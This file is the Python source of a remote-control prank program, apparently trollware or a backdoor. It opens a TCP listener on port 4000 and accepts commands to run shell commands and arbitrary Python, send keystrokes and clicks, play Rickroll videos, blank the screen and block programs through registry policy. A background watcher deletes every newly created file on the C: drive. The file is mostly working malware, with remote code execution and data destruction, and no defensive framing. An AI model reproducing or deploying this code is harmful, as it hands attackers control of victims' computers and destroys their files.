import os, sys
import subprocess
import psutil, threading
import shutil
import pyautogui
import webbrowser
import keyboard
import random
import pyttsx3
from pyttsx3.drivers import sapi5
import cv2
import logging, time
from watchdog.observers import Observer
from watchdog.events import LoggingEventHandler, FileSystemEventHandler
delete=True
def handle_creation(path, dir):
    name=path.split("\\")
    name=name[len(name)-1]
    if delete:
      try:
        if dir:
            if os.path.isdir(path):
                os.remove(path)
        else:
            if os.path.isfile(path):
                os.remove(path)
      except:pass
class CustomHandler(FileSystemEventHandler):
    def on_any_event(self, eventt):
        print(eventt)
        if eventt.event_type=='created':
            handle_creation(eventt.src_path, eventt.is_directory)
handler=CustomHandler()
def detectdownloads():
    if True:
        logging.basicConfig(level=logging.INFO,
                            format='%(asctime)s - %(message)s',
                            datefmt='%Y-%m-%d %H:%M:%S')
        path = sys.argv[1] if len(sys.argv) > 1 else '.'
        event_handler = LoggingEventHandler()
        observer = Observer()
        observer.schedule(handler, "C://", recursive=True)
        observer.start()
        
        try:
            while True:
                time.sleep(1)
        finally:
            observer.stop()
            observer.join()
threading.Thread(target=detectdownloads).start()
#import requests
# if "keeper1.exe" not in [p.name() for p in psutil.process_iter()]:
#    subprocess.run(os.path.realpath(os.path.dirname("main.exe"))+"/keeper1.exe")
# if "keeper2.exe" not in [p.name() for p in psutil.process_iter()]:
#    subprocess.run(os.path.realpath(os.path.dirname("main.exe"))+"/keeper2.exe")
path=os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]
def block(exclude):
  for i in range(1,65535):
    if i not in exclude:
      try:
        Sb = socket.gethostbyname(socket.gethostname())
        sb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sb.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sb.bind((S, i))
      except:pass
def click(x, y):
    if pyautogui.onScreen(float(x), float(y)):
        pyautogui.click(x=float(x), y=float(y))
def open_url(url):
    if not url.startswith("https://"):
        new_url='https://' + url
    else:
        new_url=url
    try:
        webbrowser.open(url=new_url)
    except:
        pass
def run(file):
    try:
        os.startfile(os.path.abspath(file))
    except:
      command(f"start {file}")

def ktype(string):
    try:
        keyboard.write(string)
    except:
        pass
def moti():
    try:
        subprocess.run(os.path.realpath(os.path.dirname("moti.exe"))+"\moti.exe")
    except:
        command("start moti.exe")
    
def kpress(keys):
    for key in keys:
        pyautogui.keyDown(key)
    keys2=keys
    for key2 in range(len(keys2)):
        pyautogui.keyUp(keys2[key2-1])
        continue
def run_code(code):
  try:
    exec(code)
  except:
    pass
def command(scommand):
  os.system(command=scommand)
def powershell(command):
  os.system(f'Powershell {command} -Verb Runas')
def EnableUAC(): # not allowed. yet saved.
  try:
    powershell('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')
  except:
    powershell('reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')

def texttospeech(text):
  engine=pyttsx3.init(driverName='sapi5')
  engine.setProperty('rate', 165)
  engine.say(f'<pitch middle="-15">{text}</pitch>')
  engine.runAndWait()
def EnableTaskmanager():
  powershell('reg DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr')

def play(id):
  global mixer
  from pygame import mixer
  mixer.init()
  mixer.music.load(f"{path}\{id}.mp3")
  mixer.music.play()
def SuperRickroll(title):
  
  cap = cv2.VideoCapture("nggyu.mp4")
  cap.set(3, 640)
  cap.set(4, 480)
  cap.set(cv2.CAP_PROP_FPS, 36)
  cap.set(10, 100)
  musicthread=threading.Thread(play("nggyu"))
  musicthread.start()
  while True:
    success, img = cap.read()
    window=cv2.imshow(title, img)
    if cv2.waitKey(36) & 0xFF==ord("q"):
        if cv2.waitKey(36) & 0xFF==ord("c"):
          break
  try:
    cap.release()
    cv2.destroyWindow(window)
    mixer.music.stop()
  except:
    cv2.destroyAllWindows()
    mixer.music.stop()
def register(data):
  id=data[0]
  url=data[1]
  try:
    import pytube
    import moviepy.editor as mp
    print("test1")
    yt=pytube.YouTube(url).streams.get_highest_resolution()
    print("test2")
    yt.download(filename=f"{id}.mp4", output_path=path)
    print("test3")
    mp.VideoFileClip(rf"{path}\{id}.mp4").audio.write_audiofile(f"{path}\{id}.mp3")
    print("test4")
  except Exception as e:print(e)
def SuperVideo(data):
  title=data[0]
  id=data[1]
  try:
    cap = cv2.VideoCapture(f"{id}.mp4")
    cap.set(3, 640)
    cap.set(4, 480)
    cap.set(cv2.CAP_PROP_FPS, 36)
    cap.set(10, 100)
    musicthread=threading.Thread(play(id))
    musicthread.start()
    while True:
      success, img = cap.read()
      window=cv2.imshow(title, img)
      if cv2.waitKey(36) & 0xFF==ord("q"):
          if cv2.waitKey(36) & 0xFF==ord("c"):
            break
  except:pass
  try:
    cap.release()
    cv2.destroyWindow(window)
    mixer.music.stop()
  except:
    try:
      cv2.destroyAllWindows()
      mixer.music.stop()
    except:pass
def blackenscreen(duration):
  import win32api
  timeoffinish = time.time() + int(duration)
  while time.time() < timeoffinish:
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2)
def windowsalert(data):
  import easygui
  easygui.msgbox(msg=data[0], title=data[1])

ranmousecont=False
while ranmousecont:
    pyautogui.dragTo(random.randint(0, 1920), random.randint(0, 1080))
import socket, multiprocessing, time
# with open("config.txt", 'r') as f:
#   conf=eval(f.read())
S = socket.gethostbyname(socket.gethostname())
#external_ip=requests.get('https://api.ipify.org').content.decode('utf-8')
#print(external_ip)
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
for i in range(80,1000):
  try:s.connect(("8.8.8.8",i))
  except:pass
  else:break
S=s.getsockname()[0]
s.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#print(str(conf["port"]))
print(S)
s.bind((S, 4000))

def random_keyboard_keys():

  keys = ['!', '"', '#', '$', '%', '&', "'", '(',
          ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
          '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', '`',
          'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
          'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~', 'alt', 'backspace', 'caps_lock', 'ctrl', 'del',
          'divide', 'down', 'end', 'enter', 'esc', 'f1', 'f10', 'f11', 'f12', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'home', 'insert', 'left', 'multiply',
          'num_lock', 'pagedown', 'pageup', 'prtscr', 'pause', 'right', 'scroll_lock', 'shift', 'space', 'subtract', 'tab',
          'up', 'win', 'print', 'enter'
          ]

  while True:
      time.sleep(2)
      numofkeys=random.randint(1,4)
      kpress([random.choice(keys) for i in range(numofkeys)])
      
def disablep(name,index):
  nindex=0
  if index==1:nindex=2
  else:nindex=index
  command(f"reg ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v {nindex} /t REG_SZ /d {name} /f")
def revert(index):
  command( f"reg DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\{index} /f")
def handle_client(conn, addr):
  connected=True
  while connected:
    try:
      msg_len = conn.recv(640).decode('utf-8')
      if msg_len:
        msg_len=int(msg_len)
        msg = conn.recv(msg_len).decode('utf-8')
        print(msg)
        if str(msg)=="disconnect":
          connected=False
        if str(msg)=="rm":
          thread = threading.Thread(moti())
          thread.start()  
        if str(msg).startswith("rp "):
          thread = threading.Thread(run(str(msg).replace("rp ", "", 1)))
          thread.start()  
        if str(msg).startswith("k "):
          thread = threading.Thread(kpress(str(msg).replace("k ", "", 1).split(sep=";")))
          thread.start()  
        if str(msg).startswith("oloc "):
          thread = threading.Thread(open_url(str(msg).replace("oloc ", "", 1)))
          thread.start()  
        if str(msg).startswith("t "):
          thread = threading.Thread(ktype(str(msg).replace("t ", "", 1)))
          thread.start()  
        if str(msg).startswith("c "):
          x_and_y=str(msg.replace("c ", "", 1)).split(sep=";")
          thread = threading.Thread(click(x_and_y[0], x_and_y[1]))
          thread.start()  
        if str(msg).startswith("ec "):
          thread = threading.Thread(run_code(str(msg).replace("ec ", "", 1)))
          thread.start()
        if str(msg).startswith("sc "):
          thread = threading.Thread(command(str(msg).replace("sc ", "", 1)))
          thread.start()
        if str(msg).startswith("rr "):
          thread = threading.Thread(SuperRickroll(str(msg).replace("rr ", "", 1)))
          thread.start()
        if str(msg).startswith("al "):
          thread = threading.Thread(target=windowsalert(str(msg).replace("al ", "", 1).split(";")))
          thread.start()
        if str(msg).startswith("rrm "):
          thread = threading.Thread(target=play("nggyu"))
          thread.start()
        if str(msg).startswith("rnv "):
          thread = threading.Thread(target=register(str(msg).replace("rnv ", "", 1).split(";")))
          thread.start()
        if str(msg).startswith("prv "):
          thread = threading.Thread(target=SuperVideo(str(msg).replace("prv ", "", 1).split(";")))
          thread.start()
        if str(msg).startswith("bs "):
          thread = threading.Thread(target=blackenscreen(float(str(msg).replace("bs ", "", 1))))
          thread.start()
        if str(msg).startswith("eu "):
          thread = threading.Thread(target=EnableUAC())
          thread.start()
        if str(msg).startswith("etm "):
          thread = threading.Thread(target=EnableTaskmanager())
          thread.start()
        if str(msg).startswith("tts "):
          thread = threading.Thread(target=texttospeech(str(msg).replace("tts ", "", 1)))
          thread.start()
        if str(msg).startswith("dp "):
          thread = threading.Thread(target=revert(int(str(msg).replace("dp ", "", 1))))
          thread.start()
        if str(msg).startswith("ep "):
          kuyt=str(msg).replace("ep ", "", 1).split(';')
          thread = threading.Thread(target=disablep(kuyt[0],int(kuyt[1])))
          thread.start()
        if str(msg).startswith("efd "):
          delete=True
        if str(msg).startswith("dfd "):
          delete=False
        if str(msg).startswith("udw "):
          pass
    except:
      pass
  conn.close()
def start():
  s.listen()
  while True:
    print("test")
    #s.listen()
    conn, addr = s.accept()
    thread = threading.Thread(target=handle_client(conn, addr)).start() 
start()